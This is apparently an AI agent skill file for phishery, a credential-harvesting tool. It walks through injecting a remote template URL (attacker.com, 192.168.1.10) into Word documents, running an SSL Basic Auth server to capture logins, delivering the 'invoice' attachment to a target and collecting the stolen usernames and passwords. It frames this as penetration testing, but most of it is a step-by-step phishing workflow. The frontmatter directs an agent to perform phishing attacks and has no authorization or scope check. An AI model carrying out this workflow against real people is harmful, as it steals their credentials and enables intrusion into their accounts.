---
name: phishery
description: Basic Authentication credential harvester and Word document template injector. Use this tool to perform phishing attacks by injecting malicious template URLs into .docx files or hosting an SSL-enabled HTTP server to capture credentials via Basic Auth dialogs. Ideal for social engineering engagements and credential harvesting during penetration tests.
---

# phishery

## Overview
phishery is a Simple SSL-enabled HTTP server designed to harvest credentials via Basic Authentication. Its primary strength lies in its ability to inject a template URL into a Microsoft Word (.docx) file. When the victim opens the document, Word attempts to fetch the template, triggering a Basic Authentication prompt that sends credentials back to the phishery server. Category: Social Engineering / Exploitation.

## Installation (if not already installed)
Assume phishery is already installed. If the command is missing:

```bash
sudo apt update && sudo apt install phishery
```

## Common Workflows

### Injecting a Malicious Template into a Word Document
Create a weaponized document that points to your harvester URL:
```bash
phishery -u https://attacker.com/docs -i legitimate.docx -o phishing_attachment.docx
```

### Starting the Credential Harvester Server
Run the server using default or custom configuration files to capture incoming credentials:
```bash
sudo phishery -s settings.json -c harvested_creds.json
```

### Full Attack Lifecycle
1. Inject the URL into a document: `phishery -u https://192.168.1.10/template -i invoice.docx -o invoice_final.docx`
2. Start the listener: `phishery -s /etc/phishery/settings.json -c creds.json`
3. Deliver `invoice_final.docx` to the target.
4. Monitor `creds.json` for captured usernames and passwords.

## Complete Command Reference

```
phishery [Options]
```

### Options

| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show usage information and exit. |
| `-v` | Show version information and exit. |
| `-s` | The JSON settings file used to setup the server. [default: "/etc/phishery/settings.json"] |
| `-c` | The JSON file to store harvested credentials. [default: "/etc/phishery/credentials.json"] |
| `-u` | The phishery URL to use as the Word document template. |
| `-i` | The source Word .docx file to inject with a template URL. |
| `-o` | The output Word .docx file containing the injected template URL. |

## Notes
- **SSL Requirement**: The server typically requires SSL to be effective, as modern Office clients may block Basic Auth over unencrypted HTTP.
- **Settings File**: The `-s` JSON file defines the listening port, SSL certificate paths, and the realm message displayed in the authentication dialog.
- **Permissions**: Running the server on privileged ports (like 443) requires sudo/root privileges.
- **Detection**: Some modern versions of Microsoft Word and EDR solutions may flag documents with external template URLs as suspicious.